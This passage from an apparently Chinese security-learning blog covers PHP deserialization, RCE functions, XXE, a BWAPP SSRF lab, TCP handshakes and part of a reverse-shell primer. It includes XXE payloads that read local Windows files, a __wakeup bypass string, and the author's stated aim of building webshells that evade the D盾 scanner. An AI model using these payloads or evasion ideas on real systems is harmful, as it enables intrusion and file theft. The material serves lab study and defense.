</code>中时，我们可以通过控制序列化字符串直接触发它们。</p><p><img src="/2021/02/14/re/5.png" alt="5"></p><p>测试：</p><img src="/2021/02/14/re/6.jpg" alt="6" style="zoom: 50%;"><p>但是D盾一般可以检测出它，所以要尽可能的构造一个不那么明显的🐎。</p><p>也可以利用别的函数构造eval语句：</p><p><img src="/2021/02/14/re/7.png" alt="7"></p><p>执行结果：</p><img src="/2021/02/14/re/8.jpg" alt="8" style="zoom:67%;"><h4 id="wakeup-绕过"><a class="header-anchor" href="#wakeup-绕过">🍭</a>__wakeup( )绕过</h4><p>多数情况下代码无法放入wakeup利用，这时候就要考虑绕过它。反序列化时，<strong>如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup( )的执行。</strong></p><p>举个简单的例子</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123; <span class="hljs-keyword">public</span> $flag = <span class="hljs-string">&#x27;111&#x27;</span>;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);&#125;&#125; <span class="hljs-comment">//?code=</span><span class="hljs-meta">?&gt;</span></code></pre><p>序列化得到<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code>,直接输入显然不行，需将1改为2（大于一的数皆可）从而绕过wakeup.</p><h4 id="构造-POP-链（同名方法利用）"><a class="header-anchor" href="#构造-POP-链（同名方法利用）">🍭</a>构造 POP 链（同名方法利用）</h4><p>PHP 反序列化条件：</p><ul><li><strong>unserialize()</strong> 参数值可控（还可以是 phar 协议）</li><li>调用危险函数路径可通。（就是找攻击点）</li></ul><p>引用 lemon 师傅的demo：</p><p><img src="/2021/02/14/re/9.png" alt="9"></p><p>获取序列化的字符串</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lemon</span> </span>&#123;    <span class="hljs-keyword">protected</span> $ClassObj;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;ClassObj = <span class="hljs-keyword">new</span> evil();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;    <span class="hljs-keyword">private</span> $data = <span class="hljs-string">&quot;phpinfo();&quot;</span>;&#125;<span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-keyword">new</span> lemon()));<span class="hljs-meta">?&gt;</span></code></pre><p>执行结果：</p><img src="/2021/02/14/re/10.jpg" alt="10" style="zoom: 50%;"><p>参考：<a href="http://aiyuanzhen.com/index.php/archives/346/#menu_index_15">浅析 PHP 反序列化漏洞的利用与审计</a></p><h4 id="Session反序列化漏洞"><a class="header-anchor" href="#Session反序列化漏洞">🍭</a>Session反序列化漏洞</h4><p>相关配置:</p><p>PHP中的Session经序列化后存储，读取时再进行反序列化</p><ul><li><code>session.save_path</code></li><li><code>session.save_handler</code>//设定用户自定义存储函数</li><li><code>session.auto_start boolen </code>//指定会话模块是否在请求开始时启动一个会话</li><li><code>session.serialize_handler string</code>//定义用来序列化/反序列化的处理器名字</li></ul><p>代码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>session_start();$_SESSION[<span class="hljs-string">&#x27;test&#x27;</span>]=$_GET[<span class="hljs-string">&#x27;test&#x27;</span>];<span class="hljs-keyword">echo</span> session_id();<span class="hljs-meta">?&gt;</span></code></pre><p>访问得到session_id值</p><p><img src="/2021/02/14/re/11.jpg" alt="11"></p><p>查找<code>session.save_path</code>配置</p><p><img src="/2021/02/14/re/12.jpg" alt="12"></p><p>查找文件</p><p><img src="/2021/02/14/re/13.jpg" alt="13"></p><p>将其命名并存储内容为序列化后的session。</p><p>PHP有三种序列化处理器：</p><ul><li><code>php</code></li><li><code>php_binary</code></li><li><code>php_serialize</code></li></ul><p>不同处理器的格式不同，当不同页面使用了不同的处理器时，由于处理的Session序列化格式不同，就可能产生反序列化漏洞。</p><p>思路：我们可以分别写两个代码，两个代码运用不同的序列化处理器处理相同的类来误导”处理器。</p><h2 id="PHAR利用"><a class="header-anchor" href="#PHAR利用">🍭</a>PHAR利用</h2><p>PHAR (“<code>Php ARchive</code>”) 是PHP里类似于JAR的一种打包文件，这个特性使得  PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行</p><p>phar详见:<a href="https://www.webhek.com/post/packaging-your-php-apps-with-phar.html">PHP开发常识：什么是Phar?</a>这里简单介绍一下。</p><p><strong>PHAR文件结构</strong></p><ul><li><code>stub </code>，文件头</li><li><code>manifest describing the contents </code>,文件描述该部分存储文件名、文件大小等信息，如下图所示。</li><li><code>the file contents</code>,文件内容</li><li><code>[optional] a signature for verifying Phar integrity (phar file format only)</code>,签名部分</li></ul><p><strong>利用</strong></p><p>PHAR文件的Meta-data可以是任何能够序列化的PHP对象，当PHAR文件被任何文件系统函数首次通过phar://协议解析时Meta-data部分会被反序列化</p><p>思路：</p><p>1.创建phar文件（<strong>phar.readonly=Off</strong>）</p><p>2.访问phar.php，在同目录下生成phar.phar文件</p><p>3.编写代码利用phar://解析<code>Meta-data</code></p><p>4.添加文件头、修改后缀的方式绕过上传检测(PHP仅通过stub部分判断文件是否为PHAR文件)</p><h2 id="总结"><a class="header-anchor" href="#总结">🍭</a>总结</h2><p>多实战，本文还是偏理论，还要多思考如何编写可以骗过安全检测软件的🐎~</p><p>参考：<a href="https://xz.aliyun.com/t/2202">PHP反序列化漏洞与Webshell</a></p><p><a href="https://www.cnblogs.com/ichunqiu/p/10484832.html">实战经验丨PHP反序列化漏洞总结</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>TLS</title>
    <link href="/2021/02/13/TLS/"/>
    <url>/2021/02/13/TLS/</url>
    
    <content type="html"><![CDATA[<h2 id="三次握手"><a class="header-anchor" href="#三次握手">🍭</a>三次握手</h2><p>对每次发送的数据量进行跟踪与协商，确保数据段的发送和接收同步，根据所接收到的数据量而确认数据发送、接收完毕后何时撤消联系，并建立虚连接。</p><p>TCP是一种面向连接的单播协议，在发送数据前，通信双方必须在彼此间建立一条连接。所谓的“连接”，其实是客户端和服务器的内存里保存的一份关于对方的信息，如ip地址、端口号等。</p><p>第一次：建立连接时，客户端发送syn包（seq=j）到服务器，并进入SYN_SENT状态，等待服务器确认；SYN：同步序列编号（Synchronize Sequence Numbers）</p><p>第二次：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（seq=k），即SYN+ACK包，此时服务器进入SYN_RECV状态。</p><p>第三次：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕，客户端和服务器进入<a href="https://baike.baidu.com/item/ESTABLISHED">ESTABLISHED</a>（TCP连接成功）状态，完成三次握手</p><p><img src="/2021/02/13/TLS/3.png" alt="3"></p><p><strong>SYN_SENT:</strong></p><p>表示客户端已发送SYN报文,与SYN_RCVD相呼应，当客户端SOCKET执行CONNECT连接时，它首先发送SYN报文，随即进入SYN_SENT状态，并等待第2个报文。</p><p><strong>SYN_RCVD:</strong></p><p>表示接受到了SYN报文，是很短暂的一个中间状态（难观察到)在这种状态下，收到客户端的ACK报文后，它会快速进入ESTABLISHED状态</p><p><strong>ETABLISHED</strong></p><p>连接已建立。</p><p>wireshark抓百度的包验证一下</p><p><img src="/2021/02/13/TLS/1.jpg" alt="1"></p><p><code>14.215.177.39</code>是百度的服务器</p><img src="/2021/02/13/TLS/2.jpg" alt="2" style="zoom:67%;"><h2 id="四次挥手"><a class="header-anchor" href="#四次挥手">🍭</a>四次挥手</h2><p>连接终止协议。TCP连接是全双工的，因此每个方向都必须单独进行关闭。这原则是当一方完成它的数据发送任务后就能发送一个FIN来终止这个方向的连接。收到一个  FIN只意味着这一方向上没有数据流动，一个TCP连接在收到一个FIN后仍能发送数据。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭</p><ol><li><p>客户端发送一个FIN段，并包含一个希望接收者看到的自己当前的序列号K. 同时还包含一个ACK表示确认对方最近一次发过来的数据。</p></li><li><p>服务端将K值加1作为ACK序号值，表明收到了上一个包。这时上层的应用程序会被告知另一端发起了关闭操作，通常这将引起应用程序发起自己的关闭操作。</p></li><li><p>服务端发起自己的FIN段，<code>ACK=K+1, Seq=L</code></p></li><li><p>客户端确认<code>ACK=L+1</code></p></li></ol><p><img src="/2021/02/13/TLS/5.png" alt="5"></p><p><strong>FIN_WAIT_1:</strong></p><p><code>FIN_WAIT_1</code>和<code>FIN_WAIT_2</code>都表示等待对方的FIN报文。区别是FIN_WAIT_1状态实际上是当SOCKET在ESTABLISHED状态时，它想主动关闭连接，向对方发送了FIN报文，此时该SOCKET即进入到FIN_WAIT_1状态。而当对方回应ACK报文后，则进入到FIN_WAIT_2状态。但是FIN_WAIT_1状态比较难见到(因为正常情况下对方会马上回应ACK报文)。</p><p><strong>FIN_WAIT_2:</strong></p><p><code>FIN_WAIT_2</code>状态下的<code>SOCKET</code>，表示半连接(有一方要求close连接，但暂时还有数据需要传送）</p><p><strong>TIME_WAIT:</strong></p><p>表示收到了对方的FIN报文，并发送出ACK报文，两个最大生存期后即可回到原始状态。<strong>如果FIN_WAIT_1状态下，收到了对方同时带FIN标志和ACK标志的报文可以直接进入到<code>TIME_WAIT</code>状态，而无须经过<code>FIN_WAIT_2</code></strong></p><p><strong>CLOSE_WAIT:</strong></p><p>表示在等待关闭，此状态下需查看是否还有数据发送给对方，若无即可关闭连接。</p><p><strong>LAST_ACK:</strong></p><p>在被动关闭一方在发送FIN报文后，等待对方的ACK报文。</p><p><strong>建立连接需要三次握手，关闭连接需要四次挥手的原因：</strong></p><p>服务端在LISTEN状态（服务器端的某个SOCKET处于监听状态，可接受连接）下，收到建立连接请求的SYN报文后，把ACK和SYN放在一个报文里发送给客户端。而关闭连接时，当收到对方的FIN报文时，仅仅表示对方不再发送数据了但是还能接收数据(上图有讲)，己方是否现在关闭发送数据通道，需要上层应用来决定。</p><p>以上多个状态可以在wireshark可以得到验证，不一一截图辽👻👻👻</p><p>参考：<a href="https://baike.baidu.com/item/%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B/7794287?fr=aladdin">百度百科</a></p><p><a href="https://zhuanlan.zhihu.com/p/53374516">三次握手，四次挥手</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RCE</title>
    <link href="/2021/02/13/RCE/"/>
    <url>/2021/02/13/RCE/</url>
    
    <content type="html"><![CDATA[<h1>RCE</h1><p>远程连接命令/代码执行漏洞，能够让攻击者直接向后台服务器远程写入服务器系统命令或者代码，从而控制后台系统。</p><h2 id="产生原因"><a class="header-anchor" href="#产生原因">🍭</a>产生原因</h2><ul><li><p>远程连接命令执行ping</p><p>应用系统从设计上需要给用户提供指定的远程命令操作的接口比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。当设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交恶意命令让后台进行执行，从而控制整个后台服务器。</p></li><li><p>远程代码执行evel命令木马</p><p>后台有时候会把用户的输入作为代码的一部分没有做过滤直接执行从而造成了远程代码执行漏洞。</p></li></ul><h2 id="危险函数"><a class="header-anchor" href="#危险函数">🍭</a>危险函数</h2><ul><li><p><code>eval（)</code></p><p>把字符串当 PHP 代码执行，该字符串必须是 PHP 代码，且以分号结尾。</p><p>在本地测试一下：</p><img src="/2021/02/13/RCE/5.jpg" alt="5" style="zoom:50%;"></li><li><p><code>preg_replace</code></p></li><li><p><code>create_function</code></p></li><li><p><code>array_map</code></p></li><li><p><code>call_user_fu</code></p></li><li><p><code>nc</code></p></li><li><p><code>assert()</code></p><p>判断一个表达式是否成立，与eval()类似。不过eval($code_str)只执行符合php编码规范的$code_str。</p></li><li><p><code>call_user_func_array</code></p></li><li><p><code>array_filter</code></p></li><li><p><code>uasor</code></p></li><li><p><code>proc_popen</code></p></li><li><p><code>passthru()</code></p><p>调用命令，输出返回执行结果。测试：</p><img src="/2021/02/13/RCE/6.jpg" alt="6" style="zoom:67%;"></li><li><p><code>system（）</code></p><p>格式：</p><blockquote><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$shell_return</span>)</span></span></code></pre></blockquote><blockquote><blockquote><p>$shell: 是shell命令, 如’netstat -tnlp’</p></blockquote></blockquote><blockquote><blockquote><p>$shell_return: shell命令执行的返回结果,命令执行成功返回0, 否则不为0</p></blockquote></blockquote><blockquote><blockquote><p>该函数执行后,直接在终端窗口打印命令执行的结果</p></blockquote></blockquote><blockquote><blockquote><p>函数的返回值是命令的执行结果的最后一行</p></blockquote></blockquote><p>在本地测试一下：</p><img src="/2021/02/13/RCE/4.jpg" alt="4" style="zoom: 50%;"></li><li><p><code>exec（）</code></p><p>格式：</p><pre><code class="hljs smali">exec (string command [, string<span class="hljs-built_in"> array </span>[,<span class="hljs-built_in"> int </span>return_var]])</code></pre><p>exec()函数与system()类似，也执行给定的命令，但不输出结果，而是返回结果的最后一行。虽然它只返回命令结果的最后一行，但用第二个参数array可以得到完整的结果，方法是把结果逐行追加到array的结尾处。测试：</p><img src="/2021/02/13/RCE/7.jpg" alt="7" style="zoom:67%;"></li><li><p><code>shell_exec</code></p><p>与exec相似，但shell_exec返回全部信息。</p></li><li><p><code>pcntl_exec</code></p></li></ul><h2 id="漏洞危害"><a class="header-anchor" href="#漏洞危害">🍭</a>漏洞危害</h2><ul><li>远程连接命令</li><li>代码执行提权</li><li>获取隐秘数据</li><li>任意文件上传</li><li>写入木马后门文件webshell</li></ul><h2 id="漏洞实践"><a class="header-anchor" href="#漏洞实践">🍭</a>漏洞实践</h2><ul><li><p>远程连接命令执行ping</p><p>我们在《command injection》执行过了这里举个例子就好，不再赘述。</p><img src="/2021/02/13/RCE/1.jpg" alt="1" style="zoom:67%;"><p>查看后台源码</p><p><img src="/2021/02/13/RCE/3.jpg" alt="3"></p><p>输入的命令没有处理，直接执行，文件弹出。</p></li><li><p>远程代码执行evel命令木马</p></li></ul><p>​      这个在之前的一句话木马也介绍一大半了</p><p>​      <code>phpinfo();</code></p><img src="/2021/02/13/RCE/8.jpg" alt="8" style="zoom:67%;"><p>​      后台代码：</p><p><img src="/2021/02/13/RCE/2.jpg" alt="2"></p><p>输入代码无过滤，直接执行。</p><h2 id="RCE防御"><a class="header-anchor" href="#RCE防御">🍭</a>RCE防御</h2><ul><li>针对危险函数，应该在危险函数代码前写好黑名单过滤特殊符号，或使用 disable_function 等手段</li><li>针对命令注入，尽量不使用命令执行函数，如果必须使用则对用户输入部分加上引号，转义输入后再渲染</li><li>如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略</li></ul><p>RCE漏洞更多的是需要实战的中的黑盒/白盒测试，本文只是梳理了基础知识，等以后接触到再细讲辽~</p><p>🍭🍭🍭🍭<img src="/2021/02/13/RCE/9.png" alt="9"></p><p>参考：<a href="https://www.sinesafe.com/article/20200305/rcebug.html">什么是RCE漏洞？如何对其进行修复加固防御的办法</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>XXE</title>
    <link href="/2021/02/10/XXE/"/>
    <url>/2021/02/10/XXE/</url>
    
    <content type="html"><![CDATA[<p>在BWAPP里做SSRF结果任务里出现了XXE，又是一个知识盲区👿 👿 👿 ，故又跑来XXE辽👻👻👻</p><h1>XXE</h1><p><code>XML External Entity</code>，XML 外部实体注入：应用程序在解析XML时没有过滤外部实体的加载，导致加载了恶意的外部文件，造成执行命令、读取文件、扫描内网、攻击内网应用等危害。</p><h2 id="XML"><a class="header-anchor" href="#XML">🍭</a>XML</h2><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素。例:</p><p><img src="/2021/02/10/XXE/1.png" alt="1"></p><p>实际上XML还包括<code>PCDATA</code>,<code>CDATA</code>模块:</p><p><strong>PCDATA</strong></p><p>被解析的字符数据（<code>parsed character data</code>）,会被解析器解析的文本。</p><p><strong>CDATA</strong></p><p>字符数据（<code>character data</code>）,不会被解析器解析的文本。当有些内容不想让解析引擎解析执行只是当做原始的内容处理时，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 &lt;&gt; &amp; 或者 &quot; 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分。</p><p>格式：</p><pre><code class="hljs xml">&lt;![CDATA[XXXXXXXXXXXXXXXXX]]&gt;</code></pre><p>作用：当某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA包裹。</p><p><strong>DTD</strong></p><p>文档类型定义(DTD)可以是内部声明也可以引用外部DTD:</p><ul><li>内部声明DTD格式：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></li><li>外部引用DTD格式：<code>&lt;!DOCTYPE 根元素 SYSTEM&quot;文件名&quot;&gt;</code></li><li>引用公共DTD:<code>&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</code></li></ul><p>DTD中进行实体声明时，将使用ENTITY关键字来声明，实体是用来定义引用普通文本或特殊字符的快捷方式的变量，实体可在内部或外部进行声明。</p><ul><li><p>内部声明实体格式：<code>&lt;!ENTITY 实体名称 “实体的值&quot;&gt;</code></p><p>一个实体由三部分构成:<code>&amp;</code>, 实体名称, <code>;</code>，<strong><code>&amp;</code>在GET和POST中都需要进行URL编码（使用参数传入xml的，&amp;符号会被认为是参数间的连接符号）</strong></p></li><li><p>引用外部实体格式：<code>&lt;!ENTITY 实体名称  SYSTEM&quot;URI&quot;&gt;</code></p><p>外部引用可支持http，file等协议，但不同的语言支持的协议不同。</p></li><li><p>引用公共实体:<code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></p></li></ul><p>上面将实体分成了内部实体和外部实体，从另一个角度，实体也可以分成通用实体和参数实体。通用实体是上述<code>&amp;</code>连接的。</p><p>参数实体：</p><ul><li><p>使用 <code>% 实体名</code> 在 DTD 中定义，且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong></p></li><li><p>只有在 DTD 文件中，参数实体的声明才能引用其他实体</p></li><li><p>参数实体也可以外部引用</p></li></ul><h2 id="XXE漏洞利用"><a class="header-anchor" href="#XXE漏洞利用">🍭</a>XXE漏洞利用</h2><p>xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。</p><p>利用方式：</p><ul><li><p>拒绝服务攻击</p></li><li><p>文件读取</p><p>通过加载外部实体，利用file://，php://等伪协议读取本地文件，但是利用file://伪协议无法读取 PHP文件的内容，因为读取的内容会被解析执行看不到源码。可以利用php://伪协议对文件内容进行Base-64编码，这样就可以读到Base-64编码后的源码，然后再通过Base64解码即可（SSRF的BWAPP任务二中有实现）</p></li><li><p>命令(代码)执行</p><p>调用<code>except://</code>伪协议调用系统命令</p></li><li><p>SQL/XSS注入</p></li><li><p>扫描端口</p></li><li><p>内网应用攻击</p></li><li><p>内网探测</p><p>利用XXE进行内网探测，如果端口开启，响应时间会很短，反之，如果关闭，响应时间就长，</p></li></ul><h3 id="Normal-XXE-读本地敏感文件"><a class="header-anchor" href="#Normal-XXE-读本地敏感文件">🍭</a>Normal XXE 读本地敏感文件</h3><p><strong>引用外部实体</strong></p><p>本来想在本地测试，结果一堆语法报错，php版本换了几次还是不行，就搭了一个测试平台来测试</p><p>payload:</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span> <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">creds</span> [  </span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">goodies</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/system.ini&quot;</span>&gt;</span> ]&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span></code></pre><p>or</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span> &gt;</span></span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY  % <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://localhost/evil.dtd&quot;</span> &gt;</span></span><span class="hljs-meta">%xxe;]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;evil;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span></code></pre><p>外部evil.dtd:</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">evil</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></code></pre><p>result：</p><img src="/2021/02/10/XXE/2.jpg" alt="2" style="zoom:80%;"><p><strong>特例:</strong></p><p>在上述payload中，若外部引用的文件存在可能会引起 xml  格式混乱的字符(在XML中，有时实体内包含了些字符，如<code>&amp;,&lt;,&gt;,&quot;,'</code>等就需要进行转义，否则会对XML解释器生成错误)，这时候就要用到上面介绍的CDATA。但我们不能在 xml 中进行拼接（会报错），只能在DTD（使用实体参数）中拼接后在 xml 中调用</p><p><img src="/2021/02/10/XXE/3.png" alt="3"></p><p><strong>内网站点的入侵</strong></p><p>在SSRF中介绍。</p><h3 id="Blind-OOB-XXE"><a class="header-anchor" href="#Blind-OOB-XXE">🍭</a>Blind  OOB XXE</h3><p>当服务器不向攻击者的浏览器或代理返回任何响应时，我们就需要构建一条外带数据(OOB)通道来读取数据。虽然我们无法直接查看文件内容，但我们仍然可以使用易受攻击的服务器作为代理，在外部网络上执行扫描以及代码。</p><p>原理如下：</p><p><img src="/2021/02/10/XXE/5.png" alt="5"></p><p>没有vps就不演示辽，XXE的BWAPP在SSRF里演示过了，不再赘述</p><h2 id="拓展"><a class="header-anchor" href="#拓展">🍭</a>拓展</h2><p><strong>XML Schema</strong>：</p><p>可扩展标记语言架构，定义 XML 文档的合法构建模块，类似 DTD，</p><p><strong>xmlns:</strong></p><p>当多个文档被一起使用时不同文档内容不同但使用定义名称相同的元素，这样就会发生命名冲突，XML解释器无法处理这类冲突，而xmlns可以解决这个问题，我们为标签添加了一个 xmlns 属性，这样就为前缀赋予了一个与某个命名空间相关联的限定名称。此时再把它们放在一起，XML解析器便不会报错。</p><p><img src="/2021/02/10/XXE/4.png" alt="4"></p><p><strong>xsi:schemaLocation属性</strong></p><p>定义XML Namespace和对应的  XSD文档的位置的关系。它的值由一个或多个URI引用对组成，两个URI之间以空白符分隔。第一个URI是定义的  XML  Namespace的值，第二个URI给出Schema文档的位置，Schema处理器将从这个位置读取Schema文档，文档的targetNamespace必须与第一个URI相匹配。</p><p><strong>XML Schema攻击方式</strong></p><ul><li>schemaLocation</li><li>noNamespaceSchemaLocation</li><li>XInclude</li><li>XSLT 攻击</li></ul><p>详见：<a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&amp;mid=2247489349&amp;idx=1&amp;sn=ab435be65bc6c35a21ea4bd040693d8c&amp;source=41#wechat_redirect">我想要一个XXE</a></p><h2 id="漏洞防御"><a class="header-anchor" href="#漏洞防御">🍭</a>漏洞防御</h2><ul><li>禁用外部实体。在代码中设置<code>libxml_disable_entity_loader(true)</code></li><li>过滤用户提交的XML数据。过滤关键词为<code>&lt;!DOCTYPE、&lt;!ENTITY、 SYSTEM和PUBLIC</code></li></ul><p>完💖💖💖💖</p><p>参考：<a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&amp;mid=2247489349&amp;idx=1&amp;sn=ab435be65bc6c35a21ea4bd040693d8c&amp;source=41#wechat_redirect">我想要一个XXE</a></p><p><a href="https://xz.aliyun.com/t/3357#toc-8">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/9626241.html">bwapp亲测xxe漏洞    </a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BWAPP||SSRF</title>
    <link href="/2021/02/10/BWAPP/"/>
    <url>/2021/02/10/BWAPP/</url>
    
    <content type="html"><![CDATA[<p>系统学习SSRF后，我们可以搭个BWAPP练习一下，BWAPP集成了各种常见漏洞和最新漏洞的开源Web应用程序，集成了超过100种漏洞，今天我们要练习一下SSRF部分（找了好久才找到SSRF板块😡😡😡）</p><p><img src="/2021/02/10/BWAPP/1.jpg" alt="1"></p><p>有三个任务：</p><p><img src="/2021/02/10/BWAPP/2.jpg" alt="2"></p><h2 id="Task-One-用远程文件包含进行端口扫描"><a class="header-anchor" href="#Task-One-用远程文件包含进行端口扫描">🍭</a>Task One:用远程文件包含进行端口扫描</h2><p>RFI,<code>Remote File Inclusion</code>远程文件包含(文件包含在dvwa那介绍过了)</p><p>从Port scan获得一份端口扫描的攻击脚本</p><p><img src="/2021/02/10/BWAPP/3.jpg" alt="3"></p><p>选择漏洞类型</p><p><img src="/2021/02/10/BWAPP/4.jpg" alt="4"></p><p>执行后发现GET请求明显存在文件包含问题</p><p><img src="/2021/02/10/BWAPP/5.jpg" alt="5"></p><p>构造payload：</p><p><img src="/2021/02/10/BWAPP/6.jpg" alt="6"></p><p>对<code>169.254.7.41</code>主机进行扫描，结果如上，成功~~</p><h2 id="Task-Two：使用XXE获取敏感文件中的内容"><a class="header-anchor" href="#Task-Two：使用XXE获取敏感文件中的内容">🍭</a>Task Two：使用XXE获取敏感文件中的内容</h2><p>XXE在另一篇文章《XXE》中介绍了，任务二的ssrf-2.txt给了我们两个代码分别完成两个小任务</p><ul><li><p>访问内部网络上的文件:</p><p><img src="/2021/02/10/BWAPP/8.jpg" alt="8"></p></li><li><p>使用PHPBase64编码器过滤器返回页面的XML模式友好版本：</p></li></ul><p><img src="/2021/02/10/BWAPP/9.jpg" alt="9"></p><p>解码:</p><p><img src="/2021/02/10/BWAPP/10.jpg" alt="10"></p><p>获取敏感文件</p><p><img src="/2021/02/10/BWAPP/7.jpg" alt="7"></p><p>Task Three拒绝服务漏洞尚未接触，等以后学了再来🌝🌝🌝🌝</p><p>参考：<a href="https://www.freebuf.com/column/157466.html">SSRF学习之路</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Reverse Shell</title>
    <link href="/2021/02/08/shell/"/>
    <url>/2021/02/08/shell/</url>
    
    <content type="html"><![CDATA[<p>最近在学习SSRF，遇到了反弹shell，又发现了知识盲区💢💢💢，故来恶补一下🎃🎃🎃</p><h1>定义</h1><p>reverse shell，控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。简而言之就是控制端可以通过执行被控端上的命令并返回到控制端上。</p><h1>用途</h1><p>当控制端通过攻击打开了被控端的一个端口，控制端在自己主机去连接被控端本机叫做正向连接。但是出现以下几种情况时正向连接就很困难：</p><ul><li>被控端被网马连接上，但它在局域网内，无法直接连接</li><li>被控端的ip动态改变</li><li>防火墙限制</li><li>连接的端口被占用</li></ul><p>这时候我们需要指定一个服务端，让受害者主机主动连接服务端程序。但我们还需了解一下反弹shell的核心。</p><h1>Linux||file discriptor</h1><p>在Linux中，当我们打开一个文件，内核为了高效管理已被打开的文件会创建索引用于指代被打开的文件，执行操作系统通过文件描述符进行调用。<strong>Linux下一切皆文件</strong>要对某个设备进行操作，就需要打开此设备的文件，打开文件就会获得该文件的文件描述符 ，每个进程在<code>Process Control  Block</code>中保存着一份文件描述符表，文件描述符就是这个表的索引，每个表项都有一个指向已打开文件的指针。故：</p><ul><li>每个文件描述符会与一个打开的文件相对应</li><li>不同的文件描述符也可能指向同一个文件</li><li>相同的文件可以被不同的进程打开，也可以在同一个进程被多次打开</li></ul><p>系统随之创建3个表：</p><ul><li>进程级的文件描述符表</li><li>系统级的文件描述符表</li><li>文件系统的i-node表</li></ul><p>3个表的作用详见:<a href="https://segmentfault.com/a/1190000009724931">文件描述符</a></p><p>当Linux启动的时候会默认打开三个文件描述符：</p><table><thead><tr><th>文件描述符</th><th>缩写</th><th>描述</th></tr></thead><tbody><tr><td>0</td><td>STDIN</td><td>标准输入</td></tr><tr><td>1</td><td>STDOUT</td><td>标准输出</td></tr><tr><td>2</td><td>STDERR</td><td>标准错误输出</td></tr></tbody></table><p>每条shell命令，都会继承其父进程的文件描述符，当我们需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p><h1>Redirect</h1><p>重定向主要分为两种</p><ul><li>输入重定向<code> &lt; &lt;&lt;</code></li><li>输出重定向 <code>&gt; &gt;&gt;</code></li></ul><table><thead><tr><th>类型</th><th>符号</th><th>格式</th><th>用法</th></tr></thead><tbody><tr><td>输入重定向</td><td><code> &lt; 